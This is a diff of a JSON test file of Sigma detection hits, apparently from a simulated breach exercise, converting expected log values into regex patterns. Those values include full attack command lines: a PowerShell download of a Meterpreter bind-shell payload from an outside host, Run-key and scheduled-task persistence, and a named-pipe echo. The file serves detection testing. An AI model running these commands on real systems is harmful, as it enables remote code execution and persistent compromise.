@@ -1,6 +1,4 @@
 {
-  "_top_level_comment": "this json contains entries for all sigma hits observed during testing",
-
   "Cleartext Protocol Usage": {
     "_link": "https://github.com/SigmaHQ/sigma/blob/0.22/rules/compliance/netflow_cleartext_protocols.yml",
     "_true_hits": [
@@ -15,11 +13,11 @@
     "conditions": {
       "entry1": [
         "document.data.process.name",
-        "Bank-of-Nuthington.exe"
+        "Bank-of-Nuthington\\.exe"
       ],
       "entry2": [
         "document.data.destination.ip",
-        "172.18.1.1"
+        "172\\.18\\.1\\.1"
       ]
     }
   },
@@ -36,15 +34,15 @@
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
-        "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\")"
+        "c:\\\\windows\\\\system32\\\\cmd\\.exe /c cmd /C powershell -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\\\\\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\\\\\", \\\\\"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\\\\\"\\)"
       ],
       "entry2": [
         "document.data.process.command_line",
-        "c:\\windows\\system32\\cmd.exe /c REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d meterpreter_bind_tcp.exe /f"
+        "c:\\\\windows\\\\system32\\\\cmd\\.exe /c REG ADD HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d meterpreter_bind_tcp\\.exe /f"
       ],
       "entry3": [
         "document.data.process.command_line",
-        "c:\\windows\\system32\\cmd.exe /c if exist C:\\Windows\\meterpreter_bind_tcp.exe (schtasks /create /sc once /st 23:59 /tn ANY_WORD_CHARS /tr C:\\Windows\\meterpreter_bind_tcp.exe /ru BREACH\\client1"
+        "c:\\\\windows\\\\system32\\\\cmd\\.exe /c if exist C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe \\(schtasks /create /sc once /st 23:59 /tn \\w+ /tr C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe /ru BREACH\\\\client1"
       ]
     }
   },
@@ -62,11 +60,11 @@
     "conditions": {
       "entry1": [
         "document.data.file.name",
-        "Bank-of-Nuthington.exe"
+        "Bank-of-Nuthington\\.exe"
       ],
       "entry2": [
         "document.data.file.name",
-        "meterpreter_bind_tcp.exe"
+        "meterpreter_bind_tcp\\.exe"
       ]
     }
   },
@@ -81,7 +79,7 @@
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
-        "REG  ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d meterpreter_bind_tcp.exe /f"
+        "REG  ADD HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d meterpreter_bind_tcp\\.exe /f"
       ]
     }
   },
@@ -106,7 +104,7 @@
     "conditions": {
       "entry1": [
         "document.data.winlog.event_data.ImagePath",
-        "cmd.exe /c echo ANY_WORD_CHARS > \\\\.\\pipe\\ANY_WORD_CHARS"
+        "cmd\\.exe /c echo \\w+ > \\\\\\\\\\.\\\\pipe\\\\\\w+"
       ]
     }
   },
@@ -121,7 +119,7 @@
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
-        "cmd.exe /c echo ANY_WORD_CHARS > \\\\.\\pipe\\ANY_WORD_CHARS"
+        "cmd\\.exe /c echo \\w+ > \\\\\\\\\\.\\\\pipe\\\\\\w+"
       ]
     }
   },
@@ -138,7 +136,7 @@
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
-        "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") "
+        "powershell  -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\\\\\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\\\\\", \\\\\"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\\\\\"\\) "
       ]
     }
   },
@@ -163,19 +161,19 @@
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
-        "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully."
+        "c:\\\\windows\\\\system32\\\\cmd\\.exe /c cmd /C powershell -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\\\\\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\\\\\", \\\\\"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\\\\\"\\) && echo File downloaded successfully\\."
       ],
       "entry2": [
         "document.data.process.command_line",
-        "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") "
+        "cmd  /C powershell -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\\\\\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\\\\\", \\\\\"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\\\\\"\\) "
       ],
       "entry3": [
         "document.data.process.command_line",
-        "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") "
+        "powershell  -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\\\\\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\\\\\", \\\\\"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\\\\\"\\) "
       ],
       "entry4": [
         "document.data.process.command_line",
-        "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"
+        "powershell -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\", \"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\"\\)"
       ]
     }
   },
@@ -190,19 +188,19 @@
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
-        "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully."
+        "c:\\\\windows\\\\system32\\\\cmd\\.exe /c cmd /C powershell -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\\\\\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\\\\\", \\\\\"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\\\\\"\\) && echo File downloaded successfully\\."
       ],
       "entry2": [
         "document.data.process.command_line",
-        "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\")"
+        "cmd  /C powershell -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\\\\\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\\\\\", \\\\\"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\\\\\"\\)"
       ],
       "entry3": [
         "document.data.process.command_line",
-        "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\")"
+        "powershell  -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\\\\\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\\\\\", \\\\\"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\\\\\"\\)"
       ],
       "entry4": [
         "document.data.process.command_line",
-        "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"
+        "powershell -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\", \"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\"\\)"
       ]
     }
   },
@@ -217,7 +215,7 @@
     "conditions": {
       "entry1": [
         "document.data.process.name",
-        "Bank-of-Nuthington.exe"
+        "Bank-of-Nuthington\\.exe"
       ]
     }
   },
@@ -232,7 +230,7 @@
     "conditions": {
       "entry1": [
         "documents.data.winlog.event_data.ImagePath",
-        "cmd.exe /c echo ANY_WORD_CHARS > \\\\.\\pipe\\ANY_WORD_CHARS"
+        "cmd\\.exe /c echo \\w+ > \\\\\\\\\\.\\\\pipe\\\\\\w+"
       ]
     }
   },
@@ -247,7 +245,7 @@
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
-        "cmd.exe /c echo ANY_WORD_CHARS > \\\\.\\pipe\\ANY_WORD_CHARS"
+        "cmd\\.exe /c echo \\w+ > \\\\\\\\\\.\\\\pipe\\\\\\w+"
       ]
     }
   },
@@ -262,11 +260,11 @@
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
-        "REG  ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d meterpreter_bind_tcp.exe /f"
+        "REG  ADD HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d meterpreter_bind_tcp\\.exe /f"
       ],
       "entry2": [
         "document.data.process.command_line",
-        "c:\\windows\\system32\\cmd.exe /c REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d meterpreter_bind_tcp.exe /f"
+        "c:\\\\windows\\\\system32\\\\cmd\\.exe /c REG ADD HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \"Meterpreter Bind TCP\" /t REG_SZ /d meterpreter_bind_tcp\\.exe /f"
       ]
     }
   },
@@ -291,7 +289,7 @@
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
-        "schtasks  /create /sc once /st 23:59 /tn ANY_WORD_CHARS /tr C:\\Windows\\meterpreter_bind_tcp.exe /ru BREACH\\client1"
+        "schtasks  /create /sc once /st 23:59 /tn \\w+ /tr C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe /ru BREACH\\\\client1"
       ]
     }
   },
@@ -348,19 +346,19 @@
     "conditions": {
       "entry1": [
         "document.data.process.command_line",
-        "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully."
+        "c:\\\\windows\\\\system32\\\\cmd\\.exe /c cmd /C powershell -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\\\\\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\\\\\", \\\\\"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\\\\\"\\) && echo File downloaded successfully\\."
       ],
       "entry2": [
         "document.data.process.command_line",
-        "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\")"
+        "cmd  /C powershell -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\\\\\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\\\\\", \\\\\"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\\\\\"\\)"
       ],
       "entry3": [
         "document.data.process.command_line",
-        "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\")"
+        "powershell  -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\\\\\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\\\\\", \\\\\"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\\\\\"\\)"
       ],
       "entry4": [
         "document.data.process.command_line",
-        "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"
+        "powershell -Command \\$c = new-object System\\.Net\\.WebClient; \\$c\\.DownloadFile\\(\"http://172\\.18\\.1\\.1/meterpreter_bind_tcp\\.exe\", \"C:\\\\Windows\\\\meterpreter_bind_tcp\\.exe\"\\)"
       ]
     }
   },
